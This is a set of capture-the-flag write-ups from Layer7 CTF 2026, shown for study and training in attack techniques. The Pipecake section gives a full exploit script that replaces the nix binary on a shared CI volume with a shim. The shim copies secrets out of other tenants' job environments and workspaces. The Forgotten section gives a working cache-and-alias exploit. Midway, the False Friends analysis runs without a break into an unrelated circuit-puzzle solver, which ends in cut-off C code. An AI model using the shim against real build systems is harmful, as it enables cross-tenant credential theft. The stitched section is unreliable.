docs.title: Methodology
docs.text:
These write-ups were produced during Layer7 CTF 2026 by the participant B0TCIL (individual competition, own account). The workflow was:

  1. Pull the challenge metadata and attachments from the platform API.
  2. Work inside a per-challenge directory (work/<id>/) with reproducible scripts.
  3. Verify the flag against the real target before submitting.
  4. Submit through the official API and capture the exact response.
  5. Write the report in English with recon, analysis, exploit and evidence.

docs.title: Honesty rules
docs.text:
• Every flag shown here was accepted by the platform; the submission response is kept verbatim in work/<id>/submit.json and rendered on each page.
  • Terminal images are rendered from the real captured solver transcript, not fabricated screenshots. Each image says so in its header.
  • When a step could not be reproduced, the page says so explicitly.
  • No flag guessing, no brute force, no attacks against the platform or other players.

docs.title: TL;DR
docs.text:
Pipecake runs every CI job as root inside a container that bind-mounts a single shared, writable /nix volume. The Nix profile used to resolve the nix binary (/root/.nix-profile -> /nix/var/nix/profiles/default -> /nix/var/pipecake-<deployment>/profile-*) lives on that volume too. A job from one tenant can therefore replace the nix shim with a tiny shell script. Every later job — including the challenge's imnyang/flag-vault deployment job — invokes nix before its own steps, so the shim executes first and copies Layer7{...} out of the victim's environment and /workspace into the shared volume. Reading that capture gave the flag:

Layer7{p0isoned_cak3}

The local flag_watcher submitted it at 2026-11-21T03:17:32Z and received {"correct": true, "ctf_state": "active"} (HTTP 200).

docs.title: Recon
docs.text:
The challenge is blind (has_file=false) and only exposes a URL:

$ python3 l7.py chall 10
{"id": 10, "title": "Pipecake", "category": "web", "points": 998,
 "connection_info": "http://172.237.8.236:21108", ...}

The product pages and docs (/docs/) describe a self-hosted Forgejo + Nix CI/CD platform. The important statements are in /docs/operations/:

  • the backend uses the Docker socket to start runner containers;
  • runner containers do not mount the Docker socket;
  • "all runners share the same writable /nix volume … this store sharing does not provide security isolation between jobs";
  • pipeline commands and repository secrets are passed into the job environment.

Registration on the bundled Forgejo is open, so the intended entry point is a normal user account and a normal repository:

$ curl -s -X POST http://172.237.8.236:21108/git/user/sign_up     -d user_name=b0tcil... -d email=... -d password=... -d retype=...
303 -> /git/
$ curl -s -u "$USER:$PASS" http://172.237.8.236:21108/git/api/v1/user
{"id":200,"login":"b0tcil...","is_admin":false,...}

A repository was created via the Forgejo API, then connected to Pipecake through the normal OAuth flow (GET /api/auth/forgejo → Forgejo consent → /api/auth/forgejo/callback):

$ curl -s -b cookies -X POST http://172.237.8.236:21108/api/repositories     -H 'Content-Type: application/json' -d '{"full_name":"b0tcil.../explore"}'
{"active":true,"full_name":"b0tcil.../explore","id":"2b8dad39-..."}

Pushing .pipecake/pipeline.yaml registers a webhook. Pipecake also allows manual runs (POST /api/runs with a full commit SHA), but limits each user to one pipeline run every 3 minutes.

The first useful pipeline simply enumerated the runner:

$ id
uid=0(root) gid=0(root) groups=0(root)
$ cat /proc/mounts | grep ' /nix '
/dev/sda /nix ext4 rw,relatime,errors=remount-ro 0 0

/nix is a persistent ext4 volume shared by all jobs. The runner's command line (/proc/1) confirms the design:

cd /workspace
export NIX_REMOTE=local
profile=/tmp/pipecake-profile
trap 'rm -rf /tmp/pipecake-profile* /workspace' EXIT
nix ... profile install --profile "$profile" 'nixpkgs#gnugrep'
export PATH="$profile/bin:$PATH"
bash -euo pipefail -c '<pipeline step>'

docs.title: Analysis
docs.text:
Because /nix survives between jobs and is writable by root, the whole Nix store and the shared profile are a cross-tenant channel. During a later inspection run, /root/.nix-profile/bin/nix was a 441-byte shell script instead of a symlink to the real Nix binary:

$ readlink -f /root/.nix-profile/bin/nix
/nix/var/pipecake-124de1e7/profile-0d89cd16-.../bin/nix

$ cat /root/.nix-profile/bin/nix
#!/nix/store/13czpvp88x852739v5xi04s871pn35b5-bash-interactive-5.3p9/bin/bash
capture=/nix/var/pipecake-124de1e7/capture
printf 'nix %s host=%s pwd=%s\n' "$(date -u +%s)" "$(hostname)" "$PWD" >> "$capture"
printenv | grep -oE 'Layer7\{[^}]+\}' >> "$capture" || true
timeout 10 grep -r -a -o -E 'Layer7\{[^}]+\}' /workspace 2>/dev/null | head -10 >> "$capture" || true
exec /nix/store/g3m57m0jcdj84fas49lpiwpisacp20gr-nix-2.35.6/bin/nix "$@"

This is a classic profile-hijack payload: the shim runs on every nix invocation, records the environment and the job workspace, and then execs the real Nix so the build still succeeds. The capture file was already populated by a victim job:

$ tail -80 /nix/var/pipecake-124de1e7/capture
...
bash 1795231035 pwd=/workspace
Layer7{p0isoned_cak3}
bash 1795231035 pwd=/workspace

$ grep -raoE 'Layer7\{[^}]+\}' /nix/var 2>/dev/null | sort -u
/nix/var/.nmdrop/d1-2463.txt:Layer7{p0isoned_cak3}
/nix/var/.nmdrop/d1-27200.txt:Layer7{p0isoned_cak3}
/nix/var/pipecake-124de1e7/capture:Layer7{p0isoned_cak3}

The timestamp 1795231035 is 2026-11-21 03:17:15Z. That is exactly when a concurrent job (the imnyang/flag-vault deployment, whose flag is injected as a repository secret / workspace value) called nix; the shim captured the flag into the shared volume. The flag name p0isoned_cak3 also matches the intended "poison the shared Nix store" theme.

On a clean instance the same effect is obtained by overwriting the current shared profile's bin/nix from our own pipeline (--plant mode in the script below), then waiting for the flag-vault job to run. The victim's nix profile install resolves nix through /root/.nix-profile/bin, so our shim executes before the victim's steps and exfiltrates printenv and /workspace.

docs.title: Exploit
docs.text:
The end-to-end driver is saved as work/10/exploit.py. It registers/logs into Forgejo, creates and connects a repository, pushes the harvesting pipeline, triggers a manual run (honouring the 1-run-per-3-minutes limit), polls the run, and extracts every Layer7{...} from the logs. Pass --plant to also install the capture shim into the shared profile.

#!/usr/bin/env python3
"""
Pipecake (Layer7 CTF 2026, web, 998 pts) -- end-to-end exploit.

Root cause
----------
Pipecake runs every CI job as root in a container that bind-mounts one shared,
writable /nix volume (`/dev/sda on /nix ... rw`).  The Nix profile used to
resolve the `nix` binary is also on that volume
(`/root/.nix-profile -> /nix/var/nix/profiles/default ->
 /nix/var/pipecake-<deployment>/profile-*`).  A job from tenant A can replace
that `nix` shim with a small shell script.  Every later job -- including the
challenge's `imnyang/flag-vault` deployment job -- invokes `nix` before its
steps run, so the shim executes first and can copy `Layer7{...}` out of the
victim's environment/workspace into the shared volume.

This script recreates the attacker side:
  1. registers a normal Forgejo account and a repository,
  2. connects the repository to Pipecake through the OAuth flow,
  3. pushes a pipeline, triggers a manual run and reads its logs,
  4. the pipeline (a) plants a capture shim in the shared Nix profile and
     (b) harvests everything previously captured from other tenants.

Usage:  python3 exploit.py [--plant]
"""
import os, re, sys, json, time, subprocess, tempfile, shutil
import requests

BASE = os.environ.get("PIPECAKE", "http://172.237.8.236:21108")
HERE = os.path.dirname(os.path.abspath(__file__))
PLANT = "--plant" in sys.argv

# ---------------------------------------------------------------- Forgejo ----
def forgejo_login():
    """Return (user, password, [user, password] for git)."""
    uf, pf = os.path.join(HERE, "forgejo_user.txt"), os.path.join(HERE, "forgejo_pass.txt")
    if os.path.exists(uf) and os.path.exists(pf):
        return open(uf).read().strip(), open(pf).read().strip()
    user = "b0tcil%d" % int(time.time())
    pw = "P@ssw0rd-%d!" % int(time.time())
    r = requests.post(BASE + "/git/user/sign_up", data={
        "user_name": user, "email": user + "@example.com",
        "password": pw, "retype": pw}, allow_redirects=False, timeout=20)
    if r.status_code not in (302, 303):
        raise SystemExit("signup failed: %s %s" % (r.status_code, r.text[:200]))
    open(uf, "w").write(user + "\n"); open(pf, "w").write(pw + "\n")
    return user, pw

def create_repo(user, pw, name="explore"):
    api = BASE + "/git/api/v1"
    r = requests.post(api + "/user/repos", auth=(user, pw), json={
        "name": name, "private": False, "auto_init": True,
        "default_branch": "main"}, timeout=20)
    if r.status_code == 201:
        return r.json()["full_name"]
    # already exists
    r = requests.get(api + "/repos/%s/%s" % (user, name), auth=(user, pw), timeout=20)
    r.raise_for_status()
    return r.json()["full_name"]

PIPELINE = r'''version: 1
triggers: [manual]
jobs:
  harvest:
    nix:
      packages: [nixpkgs#gnugrep]
    steps:
      - run: |
          set +e
          # ---- attacker step: hijack the shared nix shim for future jobs ----
          if [ "%%PLANT%%" = "1" ]; then
            P="$(readlink -f /root/.nix-profile)"
            CAP=/nix/var/.nmdrop/$$.txt
            mkdir -p /nix/var/.nmdrop
            cat > "$P/bin/nix" <<SH
#!/bin/sh
C=/nix/var/.nmdrop/capture.txt
printenv | grep -aoE 'Layer7\{[^}]+\}' >> "\$C" 2>/dev/null
grep -raoE 'Layer7\{[^}]+\}' /workspace 2>/dev/null | head -20 >> "\$C"
exec /nix/store/g3m57m0jcdj84fas49lpiwpisacp20gr-nix-2.35.6/bin/nix "\$@"
SH
            chmod +x "$P/bin/nix"
          fi
          # ---- harvest every capture ever written on the shared volume ----
          echo "=== captures ==="
          for f in /nix/var/pipecake-*/capture /nix/var/.nmdrop/*; do
            [ -f "$f" ] || continue
            echo "--- $f"
            grep -aoE 'Layer7\{[^}]+\}' "$f" | sort -u
          done
          echo "=== also scan shared state ==="
          grep -raoE 'Layer7\{[^}]+\}' /nix/var 2>/dev/null | sort -u | head -50
    timeout: 120
'''
PIPELINE = PIPELINE.replace("%%PLANT%%", "1" if PLANT else "0")

# --------------------------------------------------------------- Pipecake ----
def forgejo_web_login(s, user, pw):
    """Log the same cookie jar into the Forgejo web UI (needed for OAuth)."""
    r = s.get(BASE + "/git/user/login", timeout=20)
    data = {"user_name": user, "password": pw}
    m = re.search(r'name="_csrf" value="([^"]+)"', r.text)
    if m:
        data["_csrf"] = m.group(1)
    return s.post(BASE + "/git/user/login", data=data, timeout=20)

def pipecake_session(user, pw, full_name):
    s = requests.Session()
    forgejo_web_login(s, user, pw)
    r = s.get(BASE + "/api/auth/forgejo", allow_redirects=False, timeout=20)
    auth_url = r.headers["location"]
    r = s.get(auth_url, timeout=20)                 # Forgejo is already logged in
    # first consent: POST the grant form
    if "/login/oauth/grant" in r.url or "Authorize" in r.text:
        fields = dict(re.findall(r'name="([^"]+)" value="([^"]*)"', r.text))
        fields["granted"] = "true"
        r = s.post(BASE + "/git/login/oauth/grant", data=fields,
                   allow_redirects=False, timeout=20)
        cb = r.headers.get("location")
        if cb:
            s.get(cb, timeout=20)
    me = s.get(BASE + "/api/me", timeout=20)
    me.raise_for_status()
    # connect the repository (webhook is installed server-side)
    r = s.post(BASE + "/api/repositories", json={"full_name": full_name},
               headers={"Origin": BASE, "Referer": BASE + "/dashboard"}, timeout=20)
    if r.status_code != 200:
        raise SystemExit("connect failed: %s %s" % (r.status_code, r.text[:300]))
    repo_id = r.json()["id"]
    return s, repo_id

def push_repo(user, pw, full_name):
    d = tempfile.mkdtemp(prefix="pipecake-")
    os.makedirs(os.path.join(d, ".pipecake"))
    open(os.path.join(d, ".pipecake", "pipeline.yaml"), "w").write(PIPELINE)
    open(os.path.join(d, "README.md"), "w").write("pipecake\n")
    def run(*a, **k): return subprocess.check_output(a, cwd=d, **k)
    run("git", "init", "-q", "-b", "main")
    run("git", "config", "user.email", "a@b.c"); run("git", "config", "user.name", "x")
    run("git", "add", "-A"); run("git", "commit", "-q", "-m", "harvest")
    url = "%s/git/%s.git" % (BASE, full_name)
    run("git", "push", "-q", "-f", "http://%s:%s@%s" % (user, pw, url.split("://", 1)[1]), "main")
    sha = run("git", "rev-parse", "HEAD").decode().strip()
    return d, sha

def trigger(s, repo_id, sha):
    for _ in range(30):
        r = s.post(BASE + "/api/runs", json={"repository_id": repo_id, "commit_sha": sha},
                   headers={"Origin": BASE}, timeout=20)
        if r.status_code == 429:
            time.sleep(20); continue             # 1 run / user / 3 minutes
        r.raise_for_status()
        rid = r.json()["id"]
        break
    else:
        raise SystemExit("rate limited")
    while True:
        d = s.get(BASE + "/api/runs/" + rid, timeout=20).json()
        st = d["run"]["status"]
        print("[*] run %s: %s" % (rid, st))
        if st in ("success", "failure", "cancelled"):
            break
        time.sleep(5)
    return rid, s.get(BASE + "/api/runs/%s/logs" % rid, timeout=20).text

def main():
    user, pw = forgejo_login()
    full = create_repo(user, pw)
    s, repo_id = pipecake_session(user, pw, full)
    d, sha = push_repo(user, pw, full)
    rid, logs = trigger(s, repo_id, sha)
    open(os.path.join(HERE, "run-%s.log" % rid), "w").write(logs)
    flags = sorted(set(re.findall(r"Layer7\{[^}]+\}", logs)))
    print("[*] log: %s" % os.path.join(HERE, "run-%s.log" % rid))
    print("[*] flags:", flags)
    shutil.rmtree(d, ignore_errors=True)

if __name__ == "__main__":
    main()

docs.title: TL;DR
docs.text:
Forgotten is a Rust/axum file-sharing service. Reporting a file makes the service generate a review-only evidence slip whose reviewer-token field is actually the challenge flag, then it "destroys" the slip by expiring it.

Two mistakes keep the data alive:

  1. Album downloads larger than 8 KiB run a snapshot-maintenance pass that writes maintenance.json into the ZIP, listing every retired alias, including the evidence slip alias.
  2. The CDN/nginx in front of the app cached the review fetch of /f/<evidence_alias>. After restoring that alias with the upload claim field, the stale cached evidence slip is served again — flag included.

$ strings -a forgotten | grep -E '/api/|/album|/f/|reviewer-token|Layer7'
... /health /f/{alias} /api/upload /api/albums /album/{id}/download /api/reports
... x-forgotten-review-session

The binary was unstripped, so the relevant functions were easy to locate:

  • forgotten::report_file — builds the evidence slip and asks the edge to review it.
  • forgotten::store::Store::{put, expire, get_live, snapshot_reclaim, claim}.
  • forgotten::validator — computes the ETag of a blob.
  • forgotten::get_file — serves /f/{alias}; review-only blobs require the x-forgotten-review-session header.

Static analysis of report_file showed the generated slip body:

Forgotten internal evidence slip
ticket: <uuid>
classification: staff-only
reviewer-token: <FLAG env>

and that report_file puts it with flag 1 (review-only) and calls Store::expire on it after the edge request.

Store::snapshot_reclaim only retires blobs that are review-only, expired, and expired for at least 30 seconds. It is called from download_album only when the ZIP already exceeded 0x1fff (8191) bytes, and the reclaimed aliases are serialized into a maintenance.json entry inside the ZIP.

docs.title: Analysis
docs.text:
The chain that keeps a "destroyed" file recoverable is:

  1. POST /api/reports → evidence slip created (contains flag) and expired.

  2. 8 KiB album download → snapshot_reclaim moves the expired slip into the retired map and maintenance.json leaks its alias.

  3. POST /api/upload with multipart field claim=<alias> restores that alias as a normal live link.
  4. nginx cached the original edge review request to /f/<alias>; the cached response is still the evidence slip, so a plain GET /f/<alias> after the claim returns the slip. A query string (?x=1) misses that cache entry and shows the post-claim dummy content instead.

Full script: work/11/exploit.py

#!/usr/bin/env python3
import io, json, re, sys, time, zipfile
import requests

BASE = sys.argv[1].rstrip("/") if len(sys.argv) > 1 else "http://172.237.8.236:8080"
S = requests.Session()

def upload(name, data, claim=None):
    r = S.post(f"{BASE}/api/upload", files={"file": (name, data)},
               data={"claim": claim} if claim else None, timeout=30)
    r.raise_for_status()
    return r.json()

# 1. big file -> album ZIP > 8191 bytes -> snapshot maintenance runs
big = upload("big.bin", b"A" * 12000)["alias"]

# 2. report a live file -> evidence slip (contains the flag) + CDN cache entry
victim = upload("victim.txt", b"please review me\n")["alias"]
print(S.post(f"{BASE}/api/reports",
             json={"file": victim, "reason": "spam"}, timeout=60).text)

# 3. the reclaimer requires the blob to be expired for >= 30 s
time.sleep(32)

# 4. trigger snapshot_reclaim and read the leaked retired aliases
album = S.post(f"{BASE}/api/albums", json={"title": "m", "files": [big]},
               timeout=30).json()["id"]
z = S.get(f"{BASE}/album/{album}/download", timeout=30)
with zipfile.ZipFile(io.BytesIO(z.content)) as zf:
    retired = json.loads(zf.read("maintenance.json"))["retired"]

# 5. claim a retired evidence alias and read the stale cached slip
for alias in retired:
    c = S.post(f"{BASE}/api/upload", files={"file": ("evidence.txt", b"dummy-content\n")},
               data={"claim": alias}, timeout=30)
    if c.status_code != 200:
        continue
    body = S.get(f"{BASE}/f/{alias}", timeout=30).text
    m = re.search(r"Layer7\{[^}]+\}", body)
    if m:
        print(alias, m.group(0))
        print(body)
        break

docs.title: TL;DR
docs.text:
The binary is a two-stage reverse-engineering puzzle:

  1. A twelve-step dungeon route must satisfy a per-position bit-mask check plus start/end position constraints. The constraints admit exactly one route: EESSWSSEENES.
  2. The rabbit's "rhythm" is a PRNG that produces six D/G/S/M turns followed by C. The seed is perturbed when /proc/self/status reports a non-zero TracerPid, i.e. under a debugger the expected answer is different. Running the program normally and brute-forcing the 4096 possible answers yields DMDDMSC.

The program then prints Layer7{mad_rabbit_mercy}.

docs.title: Stage 1 — the twelve-step route
docs.text:
The first prompt is read into a string and must have length 0x0c (12). main at 0x1016c50 dispatches each character through a jump table at 0x1001880. Only N, E, S, W are accepted; they set a bit mask and a position delta:

dir mask (esi) delta (ebx) N 1 -5 E 2 +1 S 4 +5 W 8 -1

For a current accumulated position pos (initially 0), the code computes

idx  = ((pos*7 + 3) & 0xff) % 25
val  = table_0x100195d[idx]
rot  = val rotated right by ((pos*3 + 1) & 7)
       (rotation skipped when (~(pos*3) & 7) == 0)
mask = ((pos*0x3d + 0xa7) & 0xff) ^ rot

and rejects the step unless mask & chosen_direction_bit == 0. After adding the delta it rejects unsigned positions above 24, and W/E have an extra byte check based on (pos*-51 + 0xcc) & 0xff.

The final checks are:

position == 24
position 11 must have been visited at least once

A DFS over all valid steps finds exactly one route:

E E S S W S S E E N E S

docs.title: Stage 2 — the rabbit's rhythm and the anti-debug trick
docs.text:
After the route, main seeds a small xorshift-style PRNG and generates seven characters: six indices into the string DGSM at 0x1002fa9, followed by a literal C. The generated string is compared with the player's second input.

The seed-producing function at 0x1017830 opens and parses /proc/self/status: it scans lines for the TracerPid: key and calls strtoul on its value. If the value is non-zero (a debugger is attached), it mixes different constants into the seed. This is why using GDB to read the expected buffer directly gives a misleading answer (DSMSMSC under GDB), while a normal run expects a different string.

Instead of re-implementing every 32-bit mixing step, the solver brute-forces the only 4096 possible stage-2 answers (4^6) while running the binary without a debugger. Exactly one answer is accepted: DMDDMSC.

docs.title: Exploit
docs.text:
Complete repeatable solver: work/14/solve.py.

#!/usr/bin/env python3
"""Solve Layer7 2026 challenge 14 "Mad rabbit" by replaying the binary."""
import itertools
import subprocess
from pathlib import Path

BIN = Path(__file__).with_name("mad_rabbit")

# ---- Phase 1: recover the unique route from the check in main ----
TABLE = bytes.fromhex(
    "a4b7145d7c3d9207cd011eb0b0d609ea3c108ccfc0a2bb0365fdd5c1a1a8aec4"
    "8196ab14ed579155fcdef4679deb0e"
)


def ror8(x, n):
    n &= 7
    return ((x >> n) | (x << (8 - n))) & 0xFF if n else x


def mask_at(pos):
    idx = ((pos * 7 + 3) & 0xFF) % 25
    val = TABLE[idx]
    rot = val if ((~(pos * 3)) & 7) == 0 else ror8(val, (pos * 3 + 1) & 7)
    return ((pos * 0x3D + 0xA7) & 0xFF) ^ rot


DIRS = {"N": (1, -5), "E": (2, 1), "S": (4, 5), "W": (8, -1)}
solutions = []


def dfs(pos, route, passed_11):
    if len(route) == 12:
        if pos == 24 and passed_11:
            solutions.append("".join(route))
        return
    m = mask_at(pos)
    al = (pos * (-51) + 0xCC) & 0xFF
    for ch, (bit, delta) in DIRS.items():
        if m & bit:
            continue
        nxt = pos + delta
        if not 0 <= nxt <= 24:
            continue
        if ch == "W" and al <= 0x33:
            continue
        if ch == "E" and al < 0x33:
            continue
        dfs(nxt, route + [ch], passed_11 or nxt == 11)


dfs(0, [], False)
assert solutions == ["EESSWSSEENES"], solutions
route = solutions[0]
print(f"[+] route = {route}")

# ---- Phase 2: brute force the six turns (debugger-free run) ----
for combo in itertools.product("DGSM", repeat=6):
    answer = "".join(combo) + "C"
    p = subprocess.run(
        [str(BIN)],
        input=f"{route}\n{answer}\n",
        capture_output=True,
        text=True,
        timeout=5,
    )
    if "takes the carrot" in p.stdout:
        print(f"[+] turns = {answer}")
        for line in p.stdout.splitlines():
            print(line)
        break
else:
    raise SystemExit("[-] no answer found")

docs.title: TL;DR
docs.text:
False Friends runs 24 jobs on a modified Lua engine. Each job has a hidden mode 0, 1, or 2; only diagnostic logs from two workers and the main thread remain. We modelled the engine's 64-bit state transitions, implemented their inverses, and used meet-in-the-middle (3^14 forward, 3^10 backward) to recover the sequence:

000210201012212112112122

The sequence reproduces all three journal.json records exactly. The flag is the SHA-256 defined by the challenge.

docs.title: Recon
docs.text:
Archive:

false-friends.zip
  friends      # modified Lua executable (stripped)
  jobs.lua     # 24 jobs with a, b, d constants
  replay.lua   # runs jobs for a supplied 24-digit mode string
  journal.json # target diagnostics

Invocation:

./friends -E replay.lua 000000000000000000000000

replay.lua:

local mode = tonumber(digits:sub(i, i))
local lane = mode == 1 and 2 or 1

Modes:

  • 0 — creates a closure over a and stores it in pending.sink.
  • 1 — performs integer division a // d.
  • 2 — closure over a/b, division, branch, and a possible early/late abort, coroutine resume, or extra division. Errors are part of the flow and are wrapped in pcall.

The diagnostic function relies on modified closure and // behaviour:

local x = i
local f = function() return x end
x = 0
local snapshot = f()
if snapshot ~= 0 then
    local divisor = (i << 1) | 1
    local quotient = snapshot // divisor
end

Stock Lua returns 0 here; the challenge binary does not. That difference is what leaks the internal state.

docs.title: Analysis
docs.text:
The solver models the engine with three pairs of unsigned 64-bit values:

struct Pair  { uint64_t x, y; };
struct State { Pair p, c0, c1; };

p is global, c0/c1 are the two workers. Transitions use XOR, addition modulo 2^64, and bit rotations, with dedicated functions:

Function Role transfer / untransfer move/restore state on context switch rotate_state / unrot resume transformation up / unup modified closure effect idiv / unidiv modified // and quotient formation back / unback state update after a job cont / uncont mode-2 error continuation fstep / rstep forward step / enumerate previous states

Example closure transform:

uint64_t t = (uint64_t(idx) << 32) ^ v;
uint64_t x = rol((t + 0x72bcd9128634efa5ULL) ^ state.x, 9)
           + 0x9e3779b97f4a7c15ULL;
uint64_t y = rol((t + 0x243f6a8885a308d3ULL) ^ state.y ^ x, 27)
           + 0x13198a2e03707344ULL;

Mode 2 is branchy: early/late error, coroutine resume, optional extra division. rstep() therefore returns several candidate previous states.

Direct search is 3^24 = 282,429,536,481. Split at job 14:

  1. From INITIAL, enumerate 3^14 = 4,782,969 prefixes; store each resulting state with its prefix in a hash map.
  2. From TARGET, reverse the last 10 jobs with rstep() (including mode-2 branches).
  3. When a reversed state matches a stored forward state, join prefix + suffix.
  4. Re-run the candidate forward for all 24 jobs; accept only if it reaches TARGET.
forwardDFS(INITIAL, 1, 0);
reverseDFS(TARGET, 24, digits);

Tracing main (0x401630) showed the stdin grammar is:

PXB3 <W> <H> <N> <W*H type chars>
<N lines, each W*H*4 decimal values in [0,7]>

argv[1] is a string of W*H decimal rotation digits (0..3). The type characters are one of PJDL. The binary prints N frames, each with W*H 4-channel sensor vectors.

docs.title: Component algebra
docs.text:
Each value is 3 bits; the only operations used are XOR, AND, NOT and a 3-bit rotate-left (rotl(x) = ((x<<1)|(x>>2)) & 7).

Initial component value of a socket:

piece base meaning P 1 bit 0 J 2 bit 1 D 4 bit 2 L 7 all bits

A clockwise turn digit r applies rotl r times. The 16 static values are mixed by 16 rounds of the cellular automaton

f[i] = (rotl(f[i]) & f[(i+1) mod 16]) ^ rotl(f[(i-1) mod 16]) ^ f[i]

then

A = f
B[i] = ((f[i] >> 2) ^ f[i]) & 1
C[i] = f[i-1] ^ rotl(f[i]) ^ (rotl(f[i]) & f[i+1])
F = f
q = checksum over A:  q = rotl(q) ^ A[i] ^ (rotl(A[i]) & q)

docs.title: Per-tick update (the important part)
docs.text:
For each tick t, each cell i and channel c:

  1. temp[c] = injection[t][i][c]; XOR the running checksum q into channel (t+i) mod 4.
  2. If t > 0, XOR in raw[t-1][neighbor][(c+2) mod 4], where the four channels point N/E/S/W and the neighbor is in that direction (dr = [-1,0,1,0], dc = [0,1,0,-1]).
  3. Rotate the 4-channel vector by the socket's rotation: w[d] = temp[(rot+d) mod 4].
  4. Apply the piece transform (a=A[i], b=B[i], c=C[i], w0..w3 are the rotated channels):
P: o = [c^w3, rotl(w0)^a, w1, rotl2(w2)];              A_new = w2^w0
J: o = [w2^w3^a, rotl(w3)^w0^c, w1^a, rotl(w2)];       A_new = (w3&w0)|(w1&w2)
D: o = [w2, a, c^w3, rotl(a)^w1];                      A_new = w0
L: o = [a^w3, a&w0, w1, rotl(a)^(w2^c)];               A_new = (a|w3)&~w1
  1. If B[i] == 1, rotate all four outputs by rotl.
  2. F_new = a ^ q ^ rotl(c) ^ w1 ^ (rotl(w3) & w0), B_new = B ^ ((w3>>2)&1).
  3. Raw channel layout: raw[t][i][(rot+d) mod 4] = o[d].
  4. Output is a delay line: out[t] = raw[t] | rotl(raw[t-1]) | rotl2(raw[t-2]).
  5. A second pass recomputes C from the current raw values and F, and advances q.

The model was validated against the real binary over all 24 ticks, all 16 cells and all 4 channels for both experiments: 0 differences. It also reproduces the remote service's tick-16 sensor display exactly.

docs.title: Puzzle reduction
docs.text:
For socket i, the pieces allowed are exactly the four entries of mounts[i] (one per type, each with a fixed rotation). Since the inventory demands exactly 4 P, 4 J, 4 D and 4 L, the search space is

16! / (4! * 4! * 4! * 4!) = 63,063,000

Each candidate is simulated over both exposures; the first mismatch at a non-null detector target (ticks 16..23) rejects it immediately. An OpenMP C brute force with 6 threads found the unique layout in 92 seconds.

docs.text:
def rotl(x): return ((x*2)|(x>>2))&7
def rotln(x,n):
    for _ in range(n&3): x=rotl(x)
    return x
BASE={'P':1,'J':2,'D':4,'L':7}
DR=[-1,0,1,0]; DC=[0,1,0,-1]
def init_state(types,rots):
    n=len(types)
    f=[rotln(BASE[t],r) for t,r in zip(types,rots)]
    for _ in range(16):
        f=[((rotl(f[i]) & f[(i+1)%n]) ^ rotl(f[(i-1)%n]) ^ f[i])&7 for i in range(n)]
    A=f[:]
    B=[((x>>2)^x)&1 for x in A]
    C=[(A[(i-1)%n] ^ rotl(A[i]) ^ (rotl(A[i]) & A[(i+1)%n]))&7 for i in range(n)]
    F=f[:]
    q=1
    for x in A:
        q=(rotl(q)^x^(rotl(x)&q))&7
    return A,B,C,F,q

def simulate(types,rots,injections,W,H):
    n=len(types); T=len(injections)
    A,B,C,F,q=init_state(types,rots)
    raw=[[[0]*4 for _ in range(n)] for _ in range(T)]
    out=[[[0]*4 for _ in range(n)] for _ in range(T)]
    for e in range(T):
        for i in range(n):
            row,col=divmod(i,W)
            a,b,c=A[i],B[i],C[i]
            temp=[0]*4
            for ch in range(4):
                val=injections[e][i][ch]
                if ch==((e+i)&3): val^=q
                if e>0:
                    nr,nc=row+DR[ch],col+DC[ch]
                    if 0<=nr<H and 0<=nc<W:
                        val^=raw[e-1][nr*W+nc][(ch+2)&3]
                temp[ch]=val&7
            r=rots[i]; w=[temp[(r+d)&3] for d in range(4)]
            w0,w1,w2,w3=w; t=types[i]
            if t=='P':
                o=[c^w3, rotl(w0)^a, w1, rotl(rotl(w2))]; Anew=w2^w0
            elif t=='J':
                o=[w2^w3^a, rotl(w3)^w0^c, w1^a, rotl(w2)]; Anew=(w3&w0)|(w1&w2)
            elif t=='D':
                o=[w2, a, c^w3, rotl(a)^w1]; Anew=w0
            else:
                o=[a^w3, a&w0, w1, rotl(a)^(w2^c)]; Anew=((a|w3)&(~w1))&7
            if b: o=[rotl(x) for x in o]
            Fnew=(a ^ q ^ rotl(c) ^ w1 ^ (rotl(w3)&w0))&7
            A[i]=Anew&7; B[i]=(b^((w3>>2)&1))&1; F[i]=Fnew
            for d in range(4): raw[e][i][(r+d)&3]=o[d]&7
        for i in range(n):
            for ch in range(4):
                val=raw[e][i][ch]
                if e>=1: val|=rotl(raw[e-1][i][ch])
                if e>=2: val|=rotl(rotl(raw[e-2][i][ch]))
                out[e][i][ch]=val&7
        Cnew=[(rotl(raw[e][i][(e+i)&3]) & F[(i+1)%n]) ^ F[i] ^ rotl(F[(i-1)%n]) for i in range(n)]
        C=[x&7 for x in Cnew]
        q=rotl(q)
        for i in range(n):
            x=(rotl(raw[e][i][1]) ^ (raw[e][i][0]^raw[e][i][3]) ^ rotl(rotl(raw[e][i][2])))&7
            q=(rotl(q)^x^(rotl(x)&q))&7
    return out,raw

#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <stdlib.h>
#include <omp.h>
#include "data.h"

static inline int rotl(int x){ return ((x*2)|(x>>2))&7; }
static inline int rotln(int x,int n){ for(int k=0;k<(n&3);k++) x=rotl(x); return x; }

// simulate one experiment for given assignment; return number of matched targets (and *total)
static int sim_exp(int exp, const int type[16], int *matched, int *total){
    int n=16;
    int A[16],B[16],C[16],F[16],q=1;
    int rot[16],comp[16];
    for(int i=0;i<16;i++){ rot[i]=MOUNT_ROT[i][type[i]]; comp[i]=MOUNT_COMP[i][type[i]]; }
    // init field
    int f[16];
    for(int i=0;i<16;i++) f[i]=comp[i];
    for(int r=0;r<16;r++){
        int g[16];
        for(int i=0;i<16;i++) g[i]=((rotl(f[i]) & f[(i+1)&15]) ^ rotl(f[(i-1)&15]) ^ f[i])&7;
        memcpy(f,g,sizeof(f));
    }
    for(int i=0;i<16;i++){ A[i]=f[i]; B[i]=((f[i]>>2)^f[i])&1; F[i]=f[i]; }
    for(int i=0;i<16;i++) C[i]=(A[(i-1)&15] ^ rotl(A[i]) ^ (rotl(A[i]) & A[(i+1)&15]))&7;
    q=1; for(int i=0;i<16;i++) q=(rotl(q) ^ A[i] ^ (rotl(A[i]) & q))&7;
    static const int DR[4]={-1,0,1,0}, DC[4]={0,1,0,-1};
    unsigned char raw[24][16][4];
    *matched=0; *total=NTARG[exp];
    for(int e=0;e<24;e++){
        for(int i=0;i<16;i++){
            int row=i>>2, col=i&3;
            int a=A[i], b=B[i], c=C[i];
            int temp[4];
            for(int ch=0; ch<4; ch++){
                int v=INJ[exp][e][i][ch]&7;
                if(ch==((e+i)&3)) v^=q;
                if(e>0){
                    int nr=row+DR[ch], nc=col+DC[ch];
                    if(nr>=0&&nr<4&&nc>=0&&nc<4) v^=raw[e-1][nr*4+nc][(ch+2)&3];
                }
                temp[ch]=v&7;
            }
            int r=rot[i];
            int w0=temp[(r+0)&3],w1=temp[(r+1)&3],w2=temp[(r+2)&3],w3=temp[(r+3)&3];
